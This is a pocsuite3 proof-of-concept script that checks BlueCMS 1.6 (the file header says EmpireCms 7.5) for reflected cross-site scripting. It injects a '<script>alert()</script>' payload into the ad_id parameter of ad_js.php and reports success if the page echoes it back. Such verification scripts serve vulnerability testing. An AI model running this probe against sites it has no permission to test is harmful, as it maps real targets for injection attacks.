# encoding: utf-8
# Author    : Sma11stu
# Datetime  : 2021/4/4 10:30
# Product   : PyCharm
# Project   : pocsuite3
# File      : EmpireCms_7_5_xss.py
# explain   : 文件说明
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict, VUL_TYPE
from urllib.parse import urljoin

class DemoPOC(POCBase):
    vulID = 'xxx'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2021-04-04'
    createDate = '2021-04-04'
    updateDate = '2021-04-04'
    references = ['https://www.sohu.com/a/307805554_354899']
    name = 'BlueCMS V1.6 反射型XSS漏洞'
    appPowerLink = ''
    appName = 'BlueCMS'
    appVersion = '<= 1.6'
    vulType = VUL_TYPE.XSS
    desc = '''
        BlueCMS V1.6 反射型XSS漏洞
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        xss_payload = "<script>alert()</script>"
        verify_payload = "ad_js.php?ad_id=" + xss_payload
        logger.warn(verify_payload)
        veri_url = urljoin(self.url,verify_payload)
        logger.warn(veri_url)
        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        }
        try:
            resp = requests.get(veri_url,headers=headers)
            if xss_payload in resp.text and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = veri_url
                result['VerifyInfo']['Payload'] = verify_payload
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)